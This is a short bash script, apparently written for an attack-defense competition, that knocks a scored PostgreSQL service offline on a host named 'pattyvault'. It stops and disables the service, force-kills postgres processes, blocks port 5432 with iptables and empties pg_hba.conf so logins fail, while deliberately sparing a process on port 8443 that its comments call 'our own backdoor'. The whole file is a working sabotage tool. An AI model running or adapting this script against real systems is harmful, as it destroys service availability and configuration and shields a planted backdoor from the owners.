#!/bin/bash
# pattyvault (10.111.1.3) - PostgreSQL disruption
# Targets the scored PostgreSQL service (default port 5432)
# Note: our own backdoor runs on 8443 — don't touch that

# Stop the system PostgreSQL
systemctl stop postgresql postgresql@* 2>/dev/null
systemctl disable postgresql postgresql@* 2>/dev/null

# Kill any postgres processes NOT on our port 8443
for pid in $(pgrep -a postgres | grep -v "8443" | awk '{print $1}'); do
    kill -9 $pid 2>/dev/null
done

# Block default postgres port — leave 8443 open
iptables -I INPUT -p tcp --dport 5432 -j DROP

# Remove pg_hba.conf so it can't authenticate even if restarted
for conf in $(find /var/lib/postgresql -name pg_hba.conf 2>/dev/null | grep -v ".config"); do
    cp "$conf" "${conf}.bak" 2>/dev/null
    echo "" > "$conf"
done

echo "[*] PostgreSQL disruption complete on pattyvault"
